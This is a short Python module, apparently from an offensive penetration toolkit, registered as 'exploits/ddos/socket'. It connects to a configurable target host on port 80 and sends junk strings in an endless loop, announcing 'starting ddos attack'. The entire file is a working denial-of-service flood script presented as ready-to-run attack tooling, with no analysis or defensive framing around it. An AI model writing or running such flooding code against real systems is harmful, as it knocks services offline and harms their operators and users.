import time,os,socket,errno
from socket import error as SocketError
from waf.libs import variable as var
from waf.libs.color  import *

info = {
        "name"        : "socket",
        "title"       : "Sending packets",
        "module"      : "exploits/ddos/socket",
        "description" : "Sending packets  with module socket"
}

var.rports = ['80']

options ={
  "RHOSTS" : [str(var.rhosts[0]),'web target host'],
  "RPORTS" : [str(var.rports[0]),'web target port']
}

def running():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((str(var.rhosts[0]), int(var.rports[0])))
        print (blue+"[*]"+default+"starting ddos attack")
        print ("")
        while True:
             data = "efdgnbcxdfhbvvcxzdghbvcxdsfghbvvcxzsdfgfhbvcxzdsffghbvcxzsdfghbvcxzsrhtmHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH"
             s.send(data.encode("utf-8"))
             s.send(data.encode("utf-8"))
             print (blue+"[*]"+default+"attack send ")
        print (red + "[-]"+default+"use is close")

    except Exception as e:
        print(red+"\n[-]"+default+"Error : "+str(e))
